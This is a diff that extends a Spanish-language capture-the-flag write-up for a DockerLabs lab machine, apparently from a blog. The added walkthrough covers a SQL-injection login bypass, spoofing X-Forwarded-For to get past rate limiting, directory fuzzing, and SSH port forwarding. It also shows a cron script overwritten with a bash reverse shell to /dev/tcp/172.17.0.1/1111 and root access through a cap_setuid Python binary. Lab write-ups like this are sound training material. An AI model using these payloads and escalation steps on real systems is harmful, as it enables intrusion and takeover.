@@ -63,7 +63,7 @@ Probamos con más injecciones SQL y nos bloquea por haber realizados varios inte
 
 Para bypasear el rate limit podemos agregar el header `X-Forwarded-For: 127.0.0.1` e ir modificando la IP para evitar que nos bloquee.
 
-Probando con la inyección SQL `admin' --` accedemos al panel de administrador.
+Probando con la inyección SQL `admin' --` en el input `usuario` y poniendo cualquier cosa en el de `contraseña` accedemos al panel de administrador.
 
 ![SQLi](@images/writeups/dockerlabs/los3hackers/los3hackers-sqli.png)
 
@@ -74,3 +74,413 @@ En el panel de administrador encontramos la primer flag.
 <Callout type="success" title="Flag">
   \{SQLi_bypass_r4t3_l1m1t_pwn3d}
 </Callout>
+
+Fuzzeamos posibles extensiones de archivos para ver si encontramos algún archivo accesible en el servidor.
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ -t 100 -c -ic -e .html,.py,.txt,.zip
+```
+
+```plaintext
+login                   [Status: 200, Size: 5292, Words: 934, Lines: 187, Duration: 145ms]
+logout                  [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 176ms]
+wow.zip                 [Status: 403, Size: 20, Words: 3, Lines: 1, Duration: 84ms]
+dashboard               [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 245ms]
+```
+
+Descargamos el archivo.
+
+```bash
+curl -s http://172.17.0.2/wow.zip -o wow.zip -b "session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.at_JPQ.Q1EkfEOINPT8xchv3kWZOcjf1AM"
+```
+
+Vemos el tipo de archivo y su contenido.
+
+```bash
+file wow.zip
+```
+
+```plaintext
+wow.zip: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Jun 30 2026 00:27:00, uncompressed size 26, method=store
+```
+
+```bash
+7z l wow.zip
+```
+
+```plaintext
+7-Zip 26.05 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-10-21
+ 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:4096, ASM
+
+Scanning the drive for archives:
+1 file, 204 bytes (1 KiB)
+
+Listing archive: wow.zip
+
+--
+Path = wow.zip
+Type = zip
+Physical Size = 204
+
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2026-06-30 01:27:00 .....           26           26  permission.txt
+------------------- ----- ------------ ------------  ------------------------
+2026-06-30 01:27:00                 26           26  1 files
+```
+
+Extraemos el contenido del archivo.
+
+```bash
+unzip wow.zip
+```
+
+```plaintext
+Archive:  wow.zip
+ extracting: permission.txt
+```
+
+Leemos el contenido del archivo.
+
+```bash
+cat permission.txt
+```
+
+```plaintext
+redhacker:h4ck1NNN62026!!
+```
+
+Nos conectamos por SSH con las credenciales obtenidas.
+
+```bash
+ssh redhacker@172.17.0.2
+```
+
+Listamos los archivos del directorio del `redhacker`.
+
+```bash
+ls -la
+```
+
+```plaintext
+total 60
+drwxr-x--- 11 redhacker redhacker 4096 Oct 27 04:01  .
+drwxr-xr-x  1 root      root      4096 Oct 26 21:20  ..
+-rw-r--r--  1 redhacker redhacker  220 Jan  6  2022  .bash_logout
+-rw-r--r--  1 redhacker redhacker 3771 Jan  6  2022  .bashrc
+drwx------  2 redhacker redhacker 4096 Oct 27 04:01  .cache
+-rw-r--r--  1 redhacker redhacker  807 Jan  6  2022  .profile
+drwxr-xr-x  2 redhacker redhacker 4096 Oct 26 21:20 'Burp Suite'
+drwxr-xr-x  2 redhacker redhacker 4096 Oct 26 21:20 'Client Reports'
+drwxr-xr-x  2 redhacker redhacker 4096 Oct 26 21:20  DockerLabs
+drwxr-xr-x  2 redhacker redhacker 4096 Oct 26 21:20  Labs
+drwxr-xr-x  2 redhacker redhacker 4096 Oct 26 21:20  Loot
+drwxr-xr-x  2 redhacker redhacker 4096 Oct 26 21:20  Notes
+drwxr-xr-x  2 redhacker redhacker 4096 Oct 26 21:20  Screenshots
+drwxr-xr-x  2 redhacker redhacker 4096 Oct 26 21:20  Wordlists
+-rw-r--r--  1 redhacker redhacker  214 Oct 26 21:20  user.txt
+```
+
+Leemos el contenido del archivo `user.txt`.
+
+```bash
+cat user.txt
+```
+
+```plaintext
+Red...
+
+Ya es la tercera vez que olvidas la contraseña.
+
+No volveré a escribirla por ti en un archivo .zip
+
+La próxima vez revisa el portal interno que tenemos, al menos yo lo ocupo para guardar la mia.
+
+- Blue
+```
+
+El archivo hace mención a un portal interno lo que indica un servicio corriendo de forma local. Listamos las conexiones.
+
+```bash
+netstat -tulpn
+```
+
+```plaintext
+(No info could be read for "-p": geteuid()=1000 but you should be root.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+```
+
+Hacemos un local port forwarding para acceder al servicio local desde nuestra máquina atacante.
+
+```bash
+ssh -L 5000:127.0.0.1:5000 redhacker@172.17.0.2
+```
+
+Accedemos a la web en el puerto 5000 `http://localhost:5000/`.
+
+![Localhost 5000](@images/writeups/dockerlabs/los3hackers/los3hackers-localhost5000.png)
+
+Nos conectamos por SSH con las credenciales del usuario bluehacker.
+
+```bash
+ssh bluehacker@172.17.0.2
+```
+
+Listamos los archivos del directorio home del usuario bluehacker.
+
+```bash
+ls -la
+```
+
+```plaintext
+total 64
+drwxr-x--- 12 bluehacker bluehacker 4096 Oct 27 04:44  .
+drwxr-xr-x  1 root       root       4096 Oct 26 21:20  ..
+-rw-r--r--  1 bluehacker bluehacker  220 Jan  6  2022  .bash_logout
+-rw-r--r--  1 bluehacker bluehacker 3771 Jan  6  2022  .bashrc
+drwx------  2 bluehacker bluehacker 4096 Oct 27 04:44  .cache
+-rw-r--r--  1 bluehacker bluehacker  807 Jan  6  2022  .profile
+drwxr-xr-x  2 bluehacker bluehacker 4096 Oct 26 21:20 'Audit Reports'
+drwxr-xr-x  2 bluehacker bluehacker 4096 Oct 26 21:20  Backups
+drwxr-xr-x  2 bluehacker bluehacker 4096 Oct 26 21:20  Firewall
+drwxr-xr-x  2 bluehacker bluehacker 4096 Oct 26 21:20 'Incident Response'
+drwxr-xr-x  2 bluehacker bluehacker 4096 Oct 26 21:20  Logs
+drwxr-xr-x  2 bluehacker bluehacker 4096 Oct 26 21:20  Monitoring
+drwxr-xr-x  2 bluehacker bluehacker 4096 Oct 26 21:20  Policies
+drwxr-xr-x  2 bluehacker bluehacker 4096 Oct 26 21:20  SIEM
+drwxr-xr-x  2 bluehacker bluehacker 4096 Oct 26 21:20  Scripts
+-rw-r--r--  1 bluehacker bluehacker  198 Oct 26 21:20  user.txt
+```
+
+Leemos el contenido del archivo `user.txt`.
+
+```bash
+cat user.txt
+```
+
+```plaintext
+Black siempre ha sido desconfiado.
+
+Dice que las tareas importantes
+deben ejecutarse solas.
+
+Cada minuto comprueba que todo
+siga exactamente como él lo dejó.
+
+Nunca entendí su obsesión.
+
+- Blue
+```
+
+El mensaje indica que hay tareas ejecutandose cada minuto. Podemos ver qué procesos se están ejecutando.
+
+```bash
+ps aux
+```
+
+```plaintext
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.1  15444  9332 ?        Ss   Oct26   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+root          76  0.0  0.0   3896  2008 ?        Ss   Oct26   0:00 /usr/sbin/cron -P
+root          79  0.0  0.2  98664 18924 ?        S    Oct26   0:03 python3 -m http.server 5000 --bind 127.0.0.1
+root          82  0.0  0.3  32324 26032 ?        S    Oct26   0:03 /usr/bin/python3 /usr/bin/gunicorn --bind 0.0.0.0:80 --workers 4 --worker-class gthread --threads 20 --b
+root        2195  0.0  0.1  17164 11292 ?        Ss   04:01   0:00 sshd: redhacker [priv]
+redhack+    2206  0.0  0.0  17420  8120 ?        S    04:01   0:00 sshd: redhacker@pts/0
+redhack+    2207  0.0  0.0   4636  3684 pts/0    Ss+  04:01   0:00 -bash
+root        2257  0.0  0.4  41260 32620 ?        S    04:10   0:00 /usr/bin/python3 /usr/bin/gunicorn --bind 0.0.0.0:80 --workers 4 --worker-class gthread --threads 20 --b
+root        2310  0.0  0.4  41260 32620 ?        S    04:21   0:00 /usr/bin/python3 /usr/bin/gunicorn --bind 0.0.0.0:80 --workers 4 --worker-class gthread --threads 20 --b
+root        2311  0.0  0.4  41268 32620 ?        S    04:21   0:00 /usr/bin/python3 /usr/bin/gunicorn --bind 0.0.0.0:80 --workers 4 --worker-class gthread --threads 20 --b
+root        2312  0.0  0.4 114992 33760 ?        Sl   04:21   0:00 /usr/bin/python3 /usr/bin/gunicorn --bind 0.0.0.0:80 --workers 4 --worker-class gthread --threads 20 --b
+root        2400  0.0  0.1  17160 11116 ?        Ss   04:33   0:00 sshd: redhacker [priv]
+redhack+    2411  0.0  0.1  17416  8348 ?        S    04:33   0:00 sshd: redhacker@pts/1
+redhack+    2412  0.0  0.0   4504  3788 pts/1    Ss+  04:33   0:00 -bash
+root        2478  0.0  0.1  17164 11356 ?        Ss   04:44   0:00 sshd: bluehacker [priv]
+bluehac+    2489  0.0  0.1  17420  8264 ?        S    04:44   0:00 sshd: bluehacker@pts/2
+bluehac+    2490  0.0  0.0   4636  3676 pts/2    Ss   04:44   0:00 -bash
+root        2563  0.0  0.0   7340  4160 ?        S    04:58   0:00 /usr/sbin/CRON -P
+blackha+    2564  0.0  0.0   2900  1868 ?        Ss   04:58   0:00 /bin/sh -c /opt/maintenance/m.sh
+blackha+    2565  0.0  0.0   4372  3072 ?        S    04:58   0:00 /bin/bash /opt/maintenance/m.sh
+blackha+    2566  0.0  0.0   2800  1800 ?        S    04:58   0:00 sleep 55
+bluehac+    2567  0.0  0.0   7072  3156 pts/2    R+   04:58   0:00 ps aux
+```
+
+El usuario `blackhacker` está ejecutando el archivo `/opt/maintenance/m.sh`. Vemos que permisos tiene el archivo.
+
+```bash
+ls -l /opt/maintenance/m.sh
+```
+
+```plaintext
+-rwxrwxr-x 1 blackhacker bluehacker 124 Oct 26 21:20 /opt/maintenance/m.sh
+```
+
+Como estamos logueados como el usuario `bluehacker` y pertenece al grupo `bluehacker` que puede modificar el archivo que lo ejecuta el usuario `blackhacker` modificamos el archivo para obtener una reverse shell como el usuario `blackhacker`.
+
+```bash
+vim /opt/maintenance/m.sh
+```
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/172.17.0.1/1111 0>&1
+```
+
+Nos ponemos en escucha en la máquina atacante para recibir la reverse shell cuando la tarea cron ejecute el archivo.
+
+```bash
+nc -lnvp 1111
+```
+
+Recibimos la reverse shell como el usuario `blackhacker`.
+
+```plaintext
+Listening on 0.0.0.0 1111
+Connection received on 172.17.0.2 37954
+bash: cannot set terminal process group (2617): Inappropriate ioctl for device
+bash: no job control in this shell
+blackhacker@7df7608645ba:~$
+```
+
+Estabilizamos la shell.
+
+```bash
+script /dev/null -c bash
+```
+
+Presionar las teclas `ctrl + z`.
+
+```bash
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+stty rows 30 columns 171
+```
+
+Listamos los archivos del home del usuario `blackhacker`.
+
+```bash
+ls -la
+```
+
+```plaintext
+total 84
+drwxr-x--- 17 blackhacker blackhacker 4096 Oct 26 21:20 .
+drwxr-xr-x  1 root        root        4096 Oct 26 21:20 ..
+-rw-r--r--  1 blackhacker blackhacker  220 Jan  6  2022 .bash_logout
+-rw-r--r--  1 blackhacker blackhacker 3771 Jan  6  2022 .bashrc
+-rw-r--r--  1 blackhacker blackhacker  807 Jan  6  2022 .profile
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 000
+drwxr-xr-x  3 blackhacker blackhacker 4096 Oct 26 21:20 NO_BORRAR
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 dumps
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 exploits
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 final
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 final-final
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 final-v2
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 malware
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 payloads
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 persistence
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 revshells
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 stolen
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 tmp
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 tools
+-rw-r--r--  1 blackhacker blackhacker  164 Oct 26 21:20 user.txt
+drwxr-xr-x  2 blackhacker blackhacker 4096 Oct 26 21:20 work
+```
+
+Leemos el contenido del archivo `user.txt`.
+
+```bash
+cat user.txt
+```
+
+```plaintext
+No confío en contraseñas.
+
+No confío en personas.
+
+Las contraseñas se olvidan.
+Las personas cometen errores.
+
+Los privilegios...
+
+Esos sí permanecen.
+
+- Black
+```
+
+Según el contenido del archivo hay privilegios que permanecen. Listamos las capabilities para ver si hay binarios con privilegios.
+
+```bash
+getcap / -r 2>/dev/null
+```
+
+```plaintext
+/usr/local/bin/syscheck cap_setuid=ep
+```
+
+El ejecutar el binario `/usr/local/bin/syscheck` se abre Python de forma interactiva y como la capability permite modificar el UID para convertirse en cualquier otro usuario del sistema. Importamos la libreria `os`, modificamos el UID a `0` para convertirnos en `root` y ejecutamos una bash.
+
+```bash
+>>> import os
+>>> os.setuid(0)
+>>> os.system("/bin/bash")
+```
+
+Como el usuario `root` cambiamos al directorio home de `root`.
+
+```bash
+cd /root
+```
+
+Listamos los archivos del home de `root`.
+
+```bash
+ls -la
+```
+
+```plaintext
+total 20
+drwx------ 1 root root 4096 Oct 26 21:20 .
+drwxr-xr-x 1 root root 4096 Oct 26 21:20 ..
+-rw-r--r-- 1 root root 3106 Oct 15  2021 .bashrc
+-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
+-rw------- 1 root root  453 Oct 26 21:20 root.txt
+```
+
+Leemos el contenido del archivo `root.txt`.
+
+```bash
+cat root.txt
+```
+
+```plaintext
+Has llegado hasta aquí.
+
+Red te enseñó que toda aplicación puede fallar.
+
+Blue te recordó que la seguridad nunca termina.
+
+Black demostró que el conocimiento, sin ética,
+puede convertirse en un arma.
+
+No resolviste una máquina.
+
+Viviste las tres mentalidades que existen en la
+ciberseguridad.
+
+Ahora la pregunta ya no es si sabes hackear.
+
+La pregunta es...
+
+¿Qué clase de hacker quieres ser?
+
+                 — IHATEFW
+
+Gracias por jugar.
+```
